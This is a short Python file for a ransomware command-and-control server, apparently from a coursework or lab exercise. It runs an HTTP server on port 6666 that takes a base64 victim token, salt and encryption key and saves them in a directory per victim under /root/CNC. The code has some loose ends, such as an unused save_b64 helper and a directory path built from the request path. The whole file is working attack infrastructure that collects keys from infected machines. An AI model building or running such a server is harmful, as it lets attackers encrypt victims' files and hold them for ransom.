import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict) -> dict:
        # Get the token from the body
        token_b64 = body['token']
        token = base64.b64decode(token_b64)
        token_sha256 = sha256(token).hexdigest()

        # Create the directory if it doesn't exist
        directory_path = os.path.join(path, token_sha256)
        os.makedirs(directory_path, exist_ok=True)

        # Save the salt and key files in the directory
        salt_b64 = body['salt']
        salt = base64.b64decode(salt_b64)
        salt_file_path = os.path.join(directory_path, 'salt')
        with open(salt_file_path, 'wb') as f:
            f.write(salt)

        key_b64 = body['key']
        key = base64.b64decode(key_b64)
        key_file_path = os.path.join(directory_path, 'key')
        with open(key_file_path, 'wb') as f:
            f.write(key)

        return {'status': 'ok'}
           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()